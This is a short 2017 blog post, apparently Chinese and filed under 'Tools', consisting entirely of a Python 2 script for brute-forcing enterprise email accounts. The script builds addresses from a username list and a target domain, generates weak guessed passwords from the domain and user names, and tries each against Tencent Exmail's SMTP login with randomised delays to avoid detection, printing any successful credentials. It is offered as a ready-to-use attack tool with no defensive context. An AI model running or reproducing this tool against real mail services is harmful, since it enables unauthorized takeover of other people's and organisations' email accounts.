Title: 某企业邮箱爆破
Category: Tools
Date: 2017-5-19
slug: Tool


```
#!/usr/bin/env python
# coding: utf-8

import smtplib
import random
import time
import sys


def tencent(user, password):
	time.sleep(random.uniform(2, 6))
	smtp_server = "smtp.exmail.qq.com"
	smtp_port = 587
	server = smtplib.SMTP(smtp_server, smtp_port)
	server.starttls()
	try:
		server.login(user, password)
		print '[+]----------auth success------%s' % password
	except smtplib.SMTPAuthenticationError as e:
		print '[+] Auth Fail %s: %s' % (user, password)


def genpasswd(user, suffix):
	domain = suffix.split('.')[0]
	password = []
	password.append(domain + '@123')
	password.append(domain + '@1234')
	name = user.split('@')[0]
	wake_value=['!@#$%^1qazxsw2 ', 'admin!@#', 'Abc123', '123456aa~', 'qazwsx123', '1qaz2wsx', 'asd123456', '123456a~', 'Asdf1234', 'Qwer1234', 'Abcd1234', 'a123456', '123456a', name[0].upper()+name[1:]+'123', name+'123', name+'1234',name+'@2016', name+'@2017']
	password.extend(wake_value)
	return password


def genusers(userfiles, suffix):
	users = []
	with open(userfiles, 'rb') as f:
		while 1:
			user = f.readline().strip()
			if user == '':
				break
			users.append(user + '@' + suffix)
		return users

if __name__ == "__main__":
	if len(sys.argv) != 3:
		print 'Usage: %s userfile domain' % sys.argv[0]
		print '%s users.txt baidu.com' % sys.argv[0]
		exit(0)
	userfile = sys.argv[1]
	suffix = sys.argv[2]
	for user in genusers(userfile, suffix):
		for password in genpasswd(user, suffix):
			tencent(user, password)
```